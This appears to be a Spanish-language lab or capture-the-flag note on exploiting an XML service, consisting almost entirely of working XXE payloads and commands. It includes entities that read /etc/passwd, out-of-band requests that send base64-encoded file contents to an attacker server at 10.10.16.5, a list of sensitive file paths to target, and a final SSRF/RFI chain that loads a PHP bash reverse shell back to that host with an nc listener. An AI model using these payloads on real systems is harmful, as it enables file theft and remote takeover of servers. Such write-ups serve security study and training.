
![[Rebuild-image-for-blog-1024x538.png]]

---
# IDENTIFICAR
```shell
#REQUEST NORMAL
❯ curl -s -X GET 'http://10.10.10.62:56423/' | jq
{
  "Heartbeat": {
    "Ping": "Pong"
  }
}

#XXE
❯ curl -s -X POST 'http://10.10.10.62:56423/' -d "<Heartbeat><Ping>Ping</Ping></Heartbeat>" | jq
{
  "Heartbeat": {
    "Ping": "Ping"
  }
}
```


# XXE -> LFI
```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
```


# XXE -> EXTERNAL SERVER
```shell
#METODO 1
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5"> ]>
<test>&xxe;</test>


#METODO 2
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.16.5"> %xxe; ]>

--> Response PYTHON server: 10.10.10.62 - - [24/Oct/2024 13:33:17] "GET / HTTP/1.0" 200 -
```

# XXE -> LFI (ADVANCED)
```shell
❯ /bin/cat structure.xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY filename SYSTEM 'http://10.10.16.5/%file;'>">

#REQ
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.16.5/structure.xml"> %xxe; %param1; ]>
<test>&filename;</test>

#SERVIDOR DE PYTHON
10.10.10.62 - - [24/Oct/2024 13:48:01] "GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGF...[/etc/passwd]"


#RUTAS INTERESANTES
- php://filter/convert.base64-encode/resource=/etc/passwd
- php://filter/convert.base64-encode/resource=/etc/nginx/sites-avaible/default
- php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default
- php://filter/convert.base64-encode/resource=/proc/net/tcp
- php://filter/convert.base64-encode/resource=/proc/net/fib_trie
```

# XXE -> SSRF/RFI -> RCE
```SHELL
#RECURSO
❯ nvim pwned.php
<?php
	system("bash -c 'bash -i >& /dev/tcp/10.10.16.5/443 0>&1'");
?>

#LISTENER
❯ sudo rlwrap -cAr nc -nlvp 443


#REQ
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.16.5/pwned"> ]>

<test>&xxe;</test>
```